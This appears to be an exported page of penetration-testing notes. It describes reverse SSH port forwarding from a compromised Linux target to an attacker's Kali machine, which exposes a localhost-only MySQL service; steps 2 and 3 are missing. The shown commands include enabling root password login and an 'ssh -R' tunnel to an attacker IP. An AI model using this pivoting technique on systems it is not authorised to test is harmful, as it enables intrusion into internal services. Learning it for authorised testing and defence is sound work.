<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Linux target (ssh)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Linux target (ssh)</h1><br/><br /><span style="color:#a5452a;">Example for Mysql Reverse Port Forwarding</span><br />1. Find port listening for localhost(127.0.0.1), cannot be accessed externally<br />    <div class="codebox"><pre>targetSystem@linux<span style="color:#ff9d00;font-weight:700">:</span>~$ netstat -nl</pre></div><br />    <a href=""><img src="images/1343-1.png" alt="images/1343-1.png" /></a><br />4. Enable ssh on the attacker machine<br />    <div class="codebox"><pre>Attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># systemctl start ssh.socket</pre></div><br />5. <a href="https://miloserdov.org/?p=3462#:~:text=Why%20SSH%20does%20not%20accept%20root%20password">Enable ssh root login with password on the attacker machine</a><br />    <div class="codebox"><pre>Attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># gedit <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/ssh/</span>sshd_config</pre></div><br />   1) Find the line<br />       #PermitRootLogin prohibit-password<br />   2) Replace it with:<br />       PermitRootLogin yes<br />   3) Save and close the file.<br />    <a href=""><img src="images/1343-2.png" alt="images/1343-2.png" /></a><br />6. Now we can start the <span style="color:#ff0000;">Reverse Port Forwarding</span> from the TargetSystem<strong><br />    </strong><div class="codebox"><pre>targetSystem@linux<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">ssh</span> -R &lt;attackerPort&gt;<span style="color:#ff9d00;font-weight:700">:</span>127.0.0.1<span style="color:#ff9d00;font-weight:700">:</span>&lt;serviceTargetSystemPort&gt; root@&lt;attackerIp&gt;</pre></div><br />        <a href=""><img src="images/1343-3.png" alt="images/1343-3.png" /></a><br />7.  From our AttackerMachine run mysql and connect to &lt;attackerPort&gt; on the local machine, using the root user<br />    <div class="codebox"><pre>Attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># mysql -u root -h 127.0.0.1 -P &lt;attackerPort&gt;</pre></div><br />   <a href=""><img src="images/1343-4.png" alt="images/1343-4.png" /></a></div>
</body>
</html>
